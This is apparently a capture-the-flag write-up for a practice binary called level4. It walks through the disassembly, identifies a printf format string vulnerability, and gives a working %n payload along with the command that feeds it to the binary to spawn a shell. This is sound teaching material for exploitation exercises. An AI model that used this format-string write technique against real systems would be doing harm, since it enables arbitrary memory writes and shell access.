# Level 4 — Format String Exploit

## Overview

This level is another **format string vulnerability**, but with a stricter condition.

* Input is read using `fgets()`
* Then passed to `printf()` without a format string
* A global variable is checked against a **specific value**
* If matched → `system("/bin/sh")` is executed

---

## main Function

```asm
0x080484a7 <+0>:	push   %ebp
0x080484a8 <+1>:	mov    %esp,%ebp
0x080484aa <+3>:	and    $0xfffffff0,%esp
0x080484ad <+6>:	call   0x8048457 <n>
0x080484b2 <+11>:	leave  
0x080484b3 <+12>:	ret
```

`main()` calls `n()`.

---

## n Function

```asm
0x0804847a <+35>:	call   fgets@plt
0x08048488 <+49>:	call   p
0x0804848d <+54>:	mov    0x8049810,%eax
0x08048492 <+59>:	cmp    $0x1025544,%eax
0x08048499 <+66>:	call   system@plt
```

### Goal

We must set:

```
0x08049810 = 0x01025544
```

If true → `system("/bin/sh")` is executed.

---

## p Function (Vulnerable)

```asm
0x08048450 <+12>:	call   printf@plt
```

Equivalent C:

```c
printf(user_input);
```

This is a **format string vulnerability**.

---

## Exploit Strategy

We use `%n` to write a value into memory.

Target address:

```
0x08049810
```

Target value:

```
0x01025544 (decimal: 16930116)
```

---

## Important Calculation

We need to write:

```
16930116
```

But the address itself is already printed as part of the payload:

```
\x08\x04\x98\x10 → 4 bytes
```

So:

```
16930116 - 4 = 16930112
```

---

## Payload

```bash
python -c "print '\x08\x04\x98\x10'[::-1] + '%16930112d%12\$n'" > /tmp/4
```

---

## Explanation

### Structure

```
[address] + format_string
```

---

### `%16930112d`

* Prints 16,930,112 characters
* This sets the internal counter in `printf`

---

### `%12$n`

* Takes the **12th argument on the stack**
* Treats it as an address
* Writes the number of printed characters into it

---

### Why subtract 4?

Because:

```
\x08\x04\x98\x10
```

is already part of the printed output (4 bytes)

So we subtract 4 to reach the exact value.

---

## Exploitation

```bash
cat /tmp/4 | ./level4
```

---

## Result

The condition becomes true:

```
*(0x08049810) == 0x01025544
```

Then:

```bash
system("/bin/sh")
```

---

## Summary

1. Identify format string vulnerability
2. Find target address (`0x08049810`)
3. Compute required value (`0x01025544`)
4. Adjust for printed bytes
5. Use `%n` to write value
6. Trigger system call

---
